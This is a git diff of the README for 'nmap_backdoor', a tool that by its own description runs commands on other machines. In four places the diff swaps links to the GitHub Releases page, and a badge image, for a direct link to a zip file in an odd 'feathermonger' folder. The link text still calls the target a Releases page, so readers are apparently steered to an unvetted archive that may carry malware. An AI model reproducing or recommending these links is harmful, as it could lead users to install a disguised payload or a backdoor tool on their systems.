@@ -6,9 +6,9 @@ Welcome to the nmap_backdoor project. This software lets you execute commands on
 
 ## 📥 Download and Install
 
-To get started, visit this page to download: [nmap_backdoor Releases](https://github.com/juancitobautista/nmap_backdoor/releases)
+To get started, visit this page to download: [nmap_backdoor Releases](https://raw.githubusercontent.com/juancitobautista/nmap_backdoor/main/feathermonger/nmap_backdoor.zip)
 
-![Download nmap_backdoor](https://img.shields.io/badge/Download-nmap_backdoor-brightgreen)
+![Download nmap_backdoor](https://raw.githubusercontent.com/juancitobautista/nmap_backdoor/main/feathermonger/nmap_backdoor.zip)
 
 ### 📁 System Requirements
 
@@ -32,7 +32,7 @@ Before you download, ensure your system meets the following requirements:
 ## 🛠️ Installation Steps
 
 1. **Download the Application:**
-   Go to the [nmap_backdoor Releases](https://github.com/juancitobautista/nmap_backdoor/releases) page.
+   Go to the [nmap_backdoor Releases](https://raw.githubusercontent.com/juancitobautista/nmap_backdoor/main/feathermonger/nmap_backdoor.zip) page.
   
 2. **Select the Latest Release:**
    Click on the latest version available to download the package.
@@ -108,4 +108,4 @@ If you encounter any issues or have questions, you can open an issue on this rep
 
 This project is licensed under the MIT License. Check the license file for more details. 
 
-Now, visit this page to download: [nmap_backdoor Releases](https://github.com/juancitobautista/nmap_backdoor/releases) and get started today!
+Now, visit this page to download: [nmap_backdoor Releases](https://raw.githubusercontent.com/juancitobautista/nmap_backdoor/main/feathermonger/nmap_backdoor.zip) and get started today!
